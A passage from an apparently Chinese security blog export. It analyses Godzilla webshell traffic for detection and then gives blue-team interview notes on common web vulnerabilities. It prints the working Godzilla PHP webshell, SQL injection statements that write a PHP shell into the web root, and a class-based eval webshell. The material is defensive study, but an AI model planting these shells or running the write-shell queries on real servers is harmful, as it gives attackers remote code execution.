src=\"/images/%E5%B8%B8%E8%A7%81webshell%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/image-20230617191443292.png\" alt=\"image-20230617191443292\"></p>\n<p><img src=\"/images/%E5%B8%B8%E8%A7%81webshell%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/image-20230617191611258.png\" alt=\"image-20230617191611258\"></p>\n<p><img src=\"/images/%E5%B8%B8%E8%A7%81webshell%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/image-20230617191624245.png\" alt=\"image-20230617191624245\"></p>\n<p><img src=\"/images/%E5%B8%B8%E8%A7%81webshell%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/image-20230617191642290.png\" alt=\"image-20230617191642290\"></p>\n<p>然后过滤http，追踪流，发现这里是先反转字符串，然后进行base64解码</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">@<span class=\"title function_ invoke__\">session_start</span>();</span><br><span class=\"line\">@<span class=\"title function_ invoke__\">set_time_limit</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\">@<span class=\"title function_ invoke__\">error_reporting</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">encode</span>(<span class=\"params\"><span class=\"variable\">$D</span>,<span class=\"variable\">$K</span></span>)</span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">for</span>(<span class=\"variable\">$i</span>=<span class=\"number\">0</span>;<span class=\"variable\">$i</span>&lt;<span class=\"title function_ invoke__\">strlen</span>(<span class=\"variable\">$D</span>);<span class=\"variable\">$i</span>++) &#123;</span><br><span class=\"line\">        <span class=\"variable\">$c</span> = <span class=\"variable\">$K</span>[<span class=\"variable\">$i</span>+<span class=\"number\">1</span>&amp;<span class=\"number\">15</span>];</span><br><span class=\"line\">        <span class=\"variable\">$D</span>[<span class=\"variable\">$i</span>] = <span class=\"variable\">$D</span>[<span class=\"variable\">$i</span>]^<span class=\"variable\">$c</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"variable\">$D</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"variable\">$pass</span>=<span class=\"string\">&#x27;key&#x27;</span>;</span><br><span class=\"line\"><span class=\"variable\">$payloadName</span>=<span class=\"string\">&#x27;payload&#x27;</span>;</span><br><span class=\"line\"><span class=\"variable\">$key</span>=<span class=\"string\">&#x27;3c6e0b8a9c15224a&#x27;</span>;</span><br><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>(<span class=\"variable\">$_POST</span>[<span class=\"variable\">$pass</span>]))&#123;</span><br><span class=\"line\">    <span class=\"variable\">$data</span>=<span class=\"title function_ invoke__\">encode</span>(<span class=\"title function_ invoke__\">base64_decode</span>(<span class=\"variable\">$_POST</span>[<span class=\"variable\">$pass</span>]),<span class=\"variable\">$key</span>);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>(<span class=\"variable\">$_SESSION</span>[<span class=\"variable\">$payloadName</span>]))&#123;</span><br><span class=\"line\">        <span class=\"variable\">$payload</span>=<span class=\"title function_ invoke__\">encode</span>(<span class=\"variable\">$_SESSION</span>[<span class=\"variable\">$payloadName</span>],<span class=\"variable\">$key</span>);</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (<span class=\"title function_ invoke__\">strpos</span>(<span class=\"variable\">$payload</span>,<span class=\"string\">&quot;getBasicsInfo&quot;</span>)===<span class=\"literal\">false</span>)&#123;</span><br><span class=\"line\">            <span class=\"variable\">$payload</span>=<span class=\"title function_ invoke__\">encode</span>(<span class=\"variable\">$payload</span>,<span class=\"variable\">$key</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">\t\t<span class=\"keyword\">eval</span>(<span class=\"variable\">$payload</span>);</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"title function_ invoke__\">substr</span>(<span class=\"title function_ invoke__\">md5</span>(<span class=\"variable\">$pass</span>.<span class=\"variable\">$key</span>),<span class=\"number\">0</span>,<span class=\"number\">16</span>);</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"title function_ invoke__\">base64_encode</span>(<span class=\"title function_ invoke__\">encode</span>(@<span class=\"title function_ invoke__\">run</span>(<span class=\"variable\">$data</span>),<span class=\"variable\">$key</span>));</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"title function_ invoke__\">substr</span>(<span class=\"title function_ invoke__\">md5</span>(<span class=\"variable\">$pass</span>.<span class=\"variable\">$key</span>),<span class=\"number\">16</span>);</span><br><span class=\"line\">    &#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (<span class=\"title function_ invoke__\">strpos</span>(<span class=\"variable\">$data</span>,<span class=\"string\">&quot;getBasicsInfo&quot;</span>)!==<span class=\"literal\">false</span>)&#123;</span><br><span class=\"line\">            <span class=\"variable\">$_SESSION</span>[<span class=\"variable\">$payloadName</span>]=<span class=\"title function_ invoke__\">encode</span>(<span class=\"variable\">$data</span>,<span class=\"variable\">$key</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>这里只取了key经过md5加密的前面16位</p>\n<figure class=\"highlight txt\"><table><tr><td class=\"code\"><pre><span class=\"line\">md5(key)=3c6e0b8a9c15224a8228b9a98ca1531d</span><br><span class=\"line\"></span><br><span class=\"line\">$key=&#x27;3c6e0b8a9c15224a&#x27;</span><br></pre></td></tr></table></figure>\n\n<p>哥斯拉在建立连接的时候会发起三次请求</p>\n<p><img src=\"/images/%E5%B8%B8%E8%A7%81webshell%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/image-20230617193251861.png\" alt=\"image-20230617193251861\"></p>\n<p><img src=\"/images/%E5%B8%B8%E8%A7%81webshell%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/image-20230617193306481.png\" alt=\"image-20230617193306481\"></p>\n<p><img src=\"/images/%E5%B8%B8%E8%A7%81webshell%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/image-20230617193316087.png\" alt=\"image-20230617193316087\"></p>\n<blockquote>\n<p>第一次请求发现哥斯拉是为了建立session</p>\n</blockquote>\n<p><img src=\"/images/%E5%B8%B8%E8%A7%81webshell%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/image-20230617193410413.png\" alt=\"image-20230617193410413\"></p>\n<p>第一次请求并没有返回体</p>\n<blockquote>\n<p>第二次请求</p>\n</blockquote>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">@<span class=\"title function_ invoke__\">session_start</span>();</span><br><span class=\"line\">@<span class=\"title function_ invoke__\">set_time_limit</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\">@<span class=\"title function_ invoke__\">error_reporting</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">encode</span>(<span class=\"params\"><span class=\"variable\">$D</span>,<span class=\"variable\">$K</span></span>)</span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">for</span>(<span class=\"variable\">$i</span>=<span class=\"number\">0</span>;<span class=\"variable\">$i</span>&lt;<span class=\"title function_ invoke__\">strlen</span>(<span class=\"variable\">$D</span>);<span class=\"variable\">$i</span>++) &#123;</span><br><span class=\"line\">        <span class=\"variable\">$c</span> = <span class=\"variable\">$K</span>[<span class=\"variable\">$i</span>+<span class=\"number\">1</span>&amp;<span class=\"number\">15</span>];</span><br><span class=\"line\">        <span class=\"variable\">$D</span>[<span class=\"variable\">$i</span>] = <span class=\"variable\">$D</span>[<span class=\"variable\">$i</span>]^<span class=\"variable\">$c</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"variable\">$D</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"variable\">$pass</span>=<span class=\"string\">&#x27;key&#x27;</span>;</span><br><span class=\"line\"><span class=\"variable\">$payloadName</span>=<span class=\"string\">&#x27;payload&#x27;</span>;</span><br><span class=\"line\"><span class=\"variable\">$key</span>=<span class=\"string\">&#x27;3c6e0b8a9c15224a&#x27;</span>;</span><br><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>(<span class=\"variable\">$_POST</span>[<span class=\"variable\">$pass</span>]))&#123;</span><br><span class=\"line\">    <span class=\"variable\">$data</span>=<span class=\"title function_ invoke__\">encode</span>(<span class=\"title function_ invoke__\">base64_decode</span>(<span class=\"variable\">$_POST</span>[<span class=\"variable\">$pass</span>]),<span class=\"variable\">$key</span>);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>(<span class=\"variable\">$_SESSION</span>[<span class=\"variable\">$payloadName</span>]))&#123;</span><br><span class=\"line\">        <span class=\"variable\">$payload</span>=<span class=\"title function_ invoke__\">encode</span>(<span class=\"variable\">$_SESSION</span>[<span class=\"variable\">$payloadName</span>],<span class=\"variable\">$key</span>);</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (<span class=\"title function_ invoke__\">strpos</span>(<span class=\"variable\">$payload</span>,<span class=\"string\">&quot;getBasicsInfo&quot;</span>)===<span class=\"literal\">false</span>)&#123;</span><br><span class=\"line\">            <span class=\"variable\">$payload</span>=<span class=\"title function_ invoke__\">encode</span>(<span class=\"variable\">$payload</span>,<span class=\"variable\">$key</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">\t\t<span class=\"keyword\">eval</span>(<span class=\"variable\">$payload</span>);</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"title function_ invoke__\">substr</span>(<span class=\"title function_ invoke__\">md5</span>(<span class=\"variable\">$pass</span>.<span class=\"variable\">$key</span>),<span class=\"number\">0</span>,<span class=\"number\">16</span>);</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"title function_ invoke__\">base64_encode</span>(<span class=\"title function_ invoke__\">encode</span>(@<span class=\"title function_ invoke__\">run</span>(<span class=\"variable\">$data</span>),<span class=\"variable\">$key</span>));</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"title function_ invoke__\">substr</span>(<span class=\"title function_ invoke__\">md5</span>(<span class=\"variable\">$pass</span>.<span class=\"variable\">$key</span>),<span class=\"number\">16</span>);</span><br><span class=\"line\">    &#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (<span class=\"title function_ invoke__\">strpos</span>(<span class=\"variable\">$data</span>,<span class=\"string\">&quot;getBasicsInfo&quot;</span>)!==<span class=\"literal\">false</span>)&#123;</span><br><span class=\"line\">            <span class=\"variable\">$_SESSION</span>[<span class=\"variable\">$payloadName</span>]=<span class=\"title function_ invoke__\">encode</span>(<span class=\"variable\">$data</span>,<span class=\"variable\">$key</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<blockquote>\n<p>第三次请求</p>\n</blockquote>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">@<span class=\"title function_ invoke__\">session_start</span>();</span><br><span class=\"line\">@<span class=\"title function_ invoke__\">set_time_limit</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\">@<span class=\"title function_ invoke__\">error_reporting</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">encode</span>(<span class=\"params\"><span class=\"variable\">$D</span>,<span class=\"variable\">$K</span></span>)</span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">for</span>(<span class=\"variable\">$i</span>=<span class=\"number\">0</span>;<span class=\"variable\">$i</span>&lt;<span class=\"title function_ invoke__\">strlen</span>(<span class=\"variable\">$D</span>);<span class=\"variable\">$i</span>++) &#123;</span><br><span class=\"line\">        <span class=\"variable\">$c</span> = <span class=\"variable\">$K</span>[<span class=\"variable\">$i</span>+<span class=\"number\">1</span>&amp;<span class=\"number\">15</span>];</span><br><span class=\"line\">        <span class=\"variable\">$D</span>[<span class=\"variable\">$i</span>] = <span class=\"variable\">$D</span>[<span class=\"variable\">$i</span>]^<span class=\"variable\">$c</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"variable\">$D</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"variable\">$pass</span>=<span class=\"string\">&#x27;key&#x27;</span>;</span><br><span class=\"line\"><span class=\"variable\">$payloadName</span>=<span class=\"string\">&#x27;payload&#x27;</span>;</span><br><span class=\"line\"><span class=\"variable\">$key</span>=<span class=\"string\">&#x27;3c6e0b8a9c15224a&#x27;</span>;</span><br><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>(<span class=\"variable\">$_POST</span>[<span class=\"variable\">$pass</span>]))&#123;</span><br><span class=\"line\">    <span class=\"variable\">$data</span>=<span class=\"title function_ invoke__\">encode</span>(<span class=\"title function_ invoke__\">base64_decode</span>(<span class=\"variable\">$_POST</span>[<span class=\"variable\">$pass</span>]),<span class=\"variable\">$key</span>);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>(<span class=\"variable\">$_SESSION</span>[<span class=\"variable\">$payloadName</span>]))&#123;</span><br><span class=\"line\">        <span class=\"variable\">$payload</span>=<span class=\"title function_ invoke__\">encode</span>(<span class=\"variable\">$_SESSION</span>[<span class=\"variable\">$payloadName</span>],<span class=\"variable\">$key</span>);</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (<span class=\"title function_ invoke__\">strpos</span>(<span class=\"variable\">$payload</span>,<span class=\"string\">&quot;getBasicsInfo&quot;</span>)===<span class=\"literal\">false</span>)&#123;</span><br><span class=\"line\">            <span class=\"variable\">$payload</span>=<span class=\"title function_ invoke__\">encode</span>(<span class=\"variable\">$payload</span>,<span class=\"variable\">$key</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">\t\t<span class=\"keyword\">eval</span>(<span class=\"variable\">$payload</span>);</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"title function_ invoke__\">substr</span>(<span class=\"title function_ invoke__\">md5</span>(<span class=\"variable\">$pass</span>.<span class=\"variable\">$key</span>),<span class=\"number\">0</span>,<span class=\"number\">16</span>);</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"title function_ invoke__\">base64_encode</span>(<span class=\"title function_ invoke__\">encode</span>(@<span class=\"title function_ invoke__\">run</span>(<span class=\"variable\">$data</span>),<span class=\"variable\">$key</span>));</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"title function_ invoke__\">substr</span>(<span class=\"title function_ invoke__\">md5</span>(<span class=\"variable\">$pass</span>.<span class=\"variable\">$key</span>),<span class=\"number\">16</span>);</span><br><span class=\"line\">    &#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (<span class=\"title function_ invoke__\">strpos</span>(<span class=\"variable\">$data</span>,<span class=\"string\">&quot;getBasicsInfo&quot;</span>)!==<span class=\"literal\">false</span>)&#123;</span><br><span class=\"line\">            <span class=\"variable\">$_SESSION</span>[<span class=\"variable\">$payloadName</span>]=<span class=\"title function_ invoke__\">encode</span>(<span class=\"variable\">$data</span>,<span class=\"variable\">$key</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>发现其请求都是一样的，但是响应是不一样的。</p>\n<p>总结哥斯拉的流量特征：</p>\n<figure class=\"highlight txt\"><table><tr><td class=\"code\"><pre><span class=\"line\">1. 在经过base64解码之前，要进行一次反转</span><br><span class=\"line\">2. 在连接的过程中会有三次请求</span><br><span class=\"line\">3. 第一次请求并没有响应内容</span><br><span class=\"line\">4. 第二次请求和第三次请求的内容是相同的</span><br></pre></td></tr></table></figure>\n\n","categories":["web安全学习"],"tags":["misc","web","安全","hvv"]},{"title":"hvv常考面试题-蓝队","url":"/2023/06/17/hvv%E5%B8%B8%E8%80%83%E9%9D%A2%E8%AF%95%E9%A2%98-%E8%93%9D%E9%98%9F/","content":"<h2 id=\"基础知识篇\"><a href=\"#基础知识篇\" class=\"headerlink\" title=\"基础知识篇\"></a>基础知识篇</h2><h3 id=\"常见漏洞\"><a href=\"#常见漏洞\" class=\"headerlink\" title=\"常见漏洞\"></a>常见漏洞</h3><h4 id=\"SQL注入\"><a href=\"#SQL注入\" class=\"headerlink\" title=\"SQL注入\"></a>SQL注入</h4><h5 id=\"原理\"><a href=\"#原理\" class=\"headerlink\" title=\"原理\"></a>原理</h5><p>用户输入的数据被当做SQL语句执行。</p>\n<h5 id=\"分类\"><a href=\"#分类\" class=\"headerlink\" title=\"分类\"></a>分类</h5><p>联合注入、报错注入、布尔盲注、时间盲注、宽字节注入、二次注入</p>\n<h5 id=\"报错注入常用函数\"><a href=\"#报错注入常用函数\" class=\"headerlink\" title=\"报错注入常用函数\"></a>报错注入常用函数</h5><p>updatexml、extravalue、exp、floor</p>\n<h5 id=\"SQL注入常见绕过\"><a href=\"#SQL注入常见绕过\" class=\"headerlink\" title=\"SQL注入常见绕过\"></a>SQL注入常见绕过</h5><ol>\n<li>异或绕过</li>\n<li>内联注释绕过</li>\n<li>双写绕过</li>\n<li>关键字替换绕过</li>\n<li>编码绕过</li>\n</ol>\n<h5 id=\"SQL注入getshell的方式\"><a href=\"#SQL注入getshell的方式\" class=\"headerlink\" title=\"SQL注入getshell的方式\"></a>SQL注入getshell的方式</h5><ol>\n<li>outfile写shell：select ‘<?php phpinfo(); ?>‘ into outfile ‘&#x2F;var&#x2F;www&#x2F;html&#x2F;shell.php’</li>\n<li>dumpfile写shell：select ‘<?php phpinfo(); ?>‘ into dumpfile ‘&#x2F;var&#x2F;www&#x2F;html&#x2F;shell.php’</li>\n<li>基于日志写shell：<ol>\n<li>查看日志是否开启：show variable like ‘%general%’;</li>\n<li>开启日志监测：set global general_log&#x3D;on;</li>\n<li>设置日志路径：set global general_log_file&#x3D;’&#x2F;var&#x2F;www&#x2F;html&#x2F;info.php’;</li>\n<li>执行查询，写入shell：select ‘<?php phpinfo(); ?>‘;</li>\n</ol>\n</li>\n</ol>\n<h5 id=\"SQL注入写shell的条件\"><a href=\"#SQL注入写shell的条件\" class=\"headerlink\" title=\"SQL注入写shell的条件\"></a>SQL注入写shell的条件</h5><ol>\n<li>web目录具有写权限</li>\n<li>知道web网站的绝对路径</li>\n<li>secure_file_priv没有具体值</li>\n<li>GPC关闭或者单引号没有被过滤</li>\n</ol>\n<h5 id=\"outfile和dumpfile的区别\"><a href=\"#outfile和dumpfile的区别\" class=\"headerlink\" title=\"outfile和dumpfile的区别\"></a>outfile和dumpfile的区别</h5><ol>\n<li>outfile：(1)支持多行数据同时导出；(2)使用union联合查询时，要保证两侧查询的列数相同；(3)会在换行符制表符后面追加反斜杠</li>\n<li>dumpfile：(1)每次只能导出一行数据；(2)不会在换行符制表符后面追加反斜杠</li>\n</ol>\n<h4 id=\"XSS\"><a href=\"#XSS\" class=\"headerlink\" title=\"XSS\"></a>XSS</h4><h5 id=\"原理-1\"><a href=\"#原理-1\" class=\"headerlink\" title=\"原理\"></a>原理</h5><p>用户输入的数据被当做html或JS代码执行。</p>\n<h5 id=\"分类-1\"><a href=\"#分类-1\" class=\"headerlink\" title=\"分类\"></a>分类</h5><p>反射型、存储型、DOM型。</p>\n<h4 id=\"XXE\"><a href=\"#XXE\" class=\"headerlink\" title=\"XXE\"></a>XXE</h4><h5 id=\"原理-2\"><a href=\"#原理-2\" class=\"headerlink\" title=\"原理\"></a>原理</h5><p>又称为XML外部实体注入，当应用程序允许引用外部实体，但是没有对用户输入的数据进行严格的过滤和限制，攻击者就可以通过构造语句，来实现任意文件读取、代码执行等攻击。</p>\n<h4 id=\"文件上传漏洞\"><a href=\"#文件上传漏洞\" class=\"headerlink\" title=\"文件上传漏洞\"></a>文件上传漏洞</h4><h5 id=\"原理-3\"><a href=\"#原理-3\" class=\"headerlink\" title=\"原理\"></a>原理</h5><p>在存在上传点的地方，开发者没有对用户上传的文件类型以及 文件内容进行严格的过滤和限制，攻击者可以通过上传脚本文件，获取目标主机的权限，实现对目标主机的控制。</p>\n<h5 id=\"webshell常见绕过\"><a href=\"#webshell常见绕过\" class=\"headerlink\" title=\"webshell常见绕过\"></a>webshell常见绕过</h5><ol>\n<li><p>类实例化绕过：创建一个类，使用__construct魔术方法来触发木马（因为该方法会在被实例化的时候触发）</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">create</span></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">public</span> <span class=\"title function_ invoke__\">__construct</span>(<span class=\"variable\">$shell</span>)&#123;</span><br><span class=\"line\">\t@<span class=\"keyword\">eval</span>(<span class=\"variable\">$shell</span>);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">new</span> <span class=\"title function_ invoke__\">create</span>(<span class=\"variable\">$_REQUEST</span>[<span class=\"number\">8</span>]);</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n</li>\n<li><p>异或绕过</p>\n</li>\n<li><p>关键字拼接绕过</p>\n</li>\n<li><p>取反绕过</p>\n</li>\n</ol>\n<h5 id=\"文件上传常见绕过\"><a href=\"#文件上传常见绕过\" class=\"headerlink\" title=\"文件上传常见绕过\"></a>文件上传常见绕过</h5><ol>\n<li>MIME绕过</li>\n<li>前端绕过</li>\n<li>条件竞争</li>\n<li>图片马绕过</li>\n<li>后缀名替换绕过</li>\n</ol>\n<h4 id=\"CSRF\"><a href=\"#CSRF\" class=\"headerlink\" title=\"CSRF\"></a>CSRF</h4><h5 id=\"原理-4\"><a href=\"#原理-4\" class=\"headerlink\" title=\"原理\"></a>原理</h5><p>攻击者利用目标用户的身份，来执行非法操作。</p>\n<h4 id=\"SSRF\"><a href=\"#SSRF\" class=\"headerlink\" title=\"SSRF\"></a>SSRF</h4><h5 id=\"原理-5\"><a href=\"#原理-5\" class=\"headerlink\" title=\"原理\"></a>原理</h5><p>由于服务端提供了从其他服务器应用获取数据的功能，但是没有对目标地址做严格的过滤和限制，攻击者通过篡改请求发送给服务器，然后以服务器的身份来访问其他资源，可以实现窃取本地和内网敏感数据、内网探测等攻击。</p>\n<p>是一种由攻击者构造形成，由服务器发起请求的一个安全漏洞，一般情况下SSRF攻击的是外网访问不到的内部系统。</p>\n<h4 id=\"文件包含漏洞\"><a href=\"#文件包含漏洞\" class=\"headerlink\" title=\"文件包含漏洞\"></a>文件包含漏洞</h4><h5 id=\"原理-6\"><a href=\"#原理-6\" class=\"headerlink\" title=\"原理\"></a>原理</h5><p>有时候开发者为了方便引用文件，会将文件包含的代码写成一个变量，并且这个变量由前端传入，如果没有进行严格的过滤和限制，就会引发文件包含漏洞，从而执行恶意操作。</p>\n<h5 id=\"文件包含漏洞常用的伪协议\"><a href=\"#文件包含漏洞常用的伪协议\" class=\"headerlink\" title=\"文件包含漏洞常用的伪协议\"></a>文件包含漏洞常用的伪协议</h5><ol>\n<li>php:&#x2F;&#x2F;filter：读取文件源码</li>\n<li>php:&#x2F;&#x2F;input：任意代码执行</li>\n<li>data:&#x2F;&#x2F;text&#x2F;plain：任意后门执行</li>\n<li>zip:&#x2F;&#x2F;：配合文件上传开启后门</li>\n<li>file：读取任意文件</li>\n</ol>\n<h4 id=\"代码执行漏洞\"><a href=\"#代码执行漏洞\" class=\"headerlink\" title=\"代码执行漏洞\"></a>代码执行漏洞</h4><h5 id=\"原理-7\"><a href=\"#原理-7\" class=\"headerlink\" title=\"原理\"></a>原理</h5><p>应用程序在调用一些能够将字符串转换为代码的函数时，没有考虑用户是否能控制这个字符串，将造成代码执行漏洞。</p>\n<h5 id=\"常见代码执行漏洞函数\"><a href=\"#常见代码执行漏洞函数\" class=\"headerlink\" title=\"常见代码执行漏洞函数\"></a>常见代码执行漏洞函数</h5><p>eval、assert、preg_replace、create_function、array_map、call_user_func、call_user_func_array、array_filter、usort、uasort</p>\n<h4 id=\"命令执行漏洞\"><a href=\"#命令执行漏洞\" class=\"headerlink\" title=\"命令执行漏洞\"></a>命令执行漏洞</h4><h5 id=\"原理-8\"><a href=\"#原理-8\" class=\"headerlink\" title=\"原理\"></a>原理</h5><p>当用户可以控制命令执行函数中的参数时，将恶意系统命令掺杂到正常系统命令中，就可能造成命令执行攻击。</p>\n<h5 id=\"常见函数\"><a href=\"#常见函数\" class=\"headerlink\" title=\"常见函数\"></a>常见函数</h5><p>system、exec、shell_exec、popen、反引号、pcntl_exec、passthru、prco_open</p>\n<h4 id=\"反序列化漏洞\"><a href=\"#反序列化漏洞\" class=\"headerlink\" title=\"反序列化漏洞\"></a>反序列化漏洞</h4><h5 id=\"原理-9\"><a href=\"#原理-9\" class=\"headerlink\" title=\"原理\"></a>原理</h5><p>程序在处理数据时，对反序列化类型的数据没有进行足够的验证和过滤，导致攻击者可以通过构造恶意数据触发程序解析并执行攻击者预设的代码，从而实现对程序的控制。</p>\n<h5 id=\"序列化和反序列化\"><a href=\"#序列化和反序列化\" class=\"headerlink\" title=\"序列化和反序列化\"></a>序列化和反序列化</h5><p>序列化就是将对象转换为字节流的过程，反序列化就是将字节流转换为对象的过程。</p>\n<h5 id=\"常见的反序列化魔法函数\"><a href=\"#常见的反序列化魔法函数\" class=\"headerlink\" title=\"常见的反序列化魔法函数\"></a>常见的反序列化魔法函数</h5><ol>\n<li>__invoke：当一个对象被当做函数调用时，会调用该方法</li>\n<li>__construct：当一个对象被实例化时会调用该方法</li>\n<li>__toString：当一个对象被当做字符串调用或输出时会调用该方法</li>\n<li>__wakeup：当序列化时自动调用</li>\n<li>__get：访问私有变量或不存在的变量时，自动回调</li>\n<li>__destruct：对象销毁时调用</li>\n<li>__sleep：序列化时会使对象休眠，调用sleep</li>\n<li>__call：当调用的对象不存在时自动调用该方法</li>\n<li>__isset：在不可访问的属性上调用isset函数或者empty函数触发</li>\n<li>__unset：在不可访问的属性上调用unset函数时触发</li>\n<li>__set：可以用于私有成员属性设置值，给一个未定义的属性赋值时会被触发</li>\n<li>__clone：当对象复制完成时调用</li>\n</ol>\n<h5 id=\"Java反序列化\"><a href=\"#Java反序列化\" class=\"headerlink\" title=\"Java反序列化\"></a>Java反序列化</h5><figure class=\"highlight txt\"><table><tr><td class=\"code\"><pre><span class=\"line\">Java反序列化就是将java对象转化为字节序列的过程。反序列化的过程就是</span><br><span class=\"line\">    1. 创建一个对象输出流</span><br><span class=\"line\">    2. 通过对象输出流的ReadObject()方法来读取对象</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"任意文件操作\"><a href=\"#任意文件操作\" class=\"headerlink\" title=\"任意文件操作\"></a>任意文件操作</h4><h5 id=\"任意文件读取和任意文件下载原理\"><a href=\"#任意文件读取和任意文件下载原理\" class=\"headerlink\" title=\"任意文件读取和任意文件下载原理\"></a>任意文件读取和任意文件下载原理</h5><p>在某些网站中，给用户提供了文件查看或者下载的功能，但是没有对用户查看或者下载的文件做限制，就可能导致任意文件下载或读取。</p>\n<h4 id=\"逻辑漏洞\"><a href=\"#逻辑漏洞\" class=\"headerlink\" title=\"逻辑漏洞\"></a>逻辑漏洞</h4><h5 id=\"越权漏洞原理\"><a href=\"#越权漏洞原理\" class=\"headerlink\" title=\"越权漏洞原理\"></a>越权漏洞原理</h5><p>攻击者可以在获取到低权限用户后，利用一些方式绕过权限检查，访问或者操作其他用户或者高权限用户。可以分为垂直越权和水平越权。漏洞的成因是对客户端提交的数据过于信任，在程序中没有对用户的操作进行严格的权限判断，就可能导致越权漏洞。</p>\n<h5 id=\"常见逻辑漏洞\"><a href=\"#常见逻辑漏洞\" class=\"headerlink\" title=\"常见逻辑漏洞\"></a>常见逻辑漏洞</h5><p>验证码绕过、越权漏洞、未授权访问。</p>\n<h3 id=\"工具的基本使用\"><a href=\"#工具的基本使用\" class=\"headerlink\" title=\"工具的基本使用\"></a>工具的基本使用</h3><h4 id=\"nmap的基本使用\"><a href=\"#nmap的基本使用\" class=\"headerlink\" title=\"nmap的基本使用\"></a>nmap的基本使用</h4><ul>\n<li>-sT：TCP全连接扫描，准确但是会留下大量的日志</li>\n<li>-sS：TCP 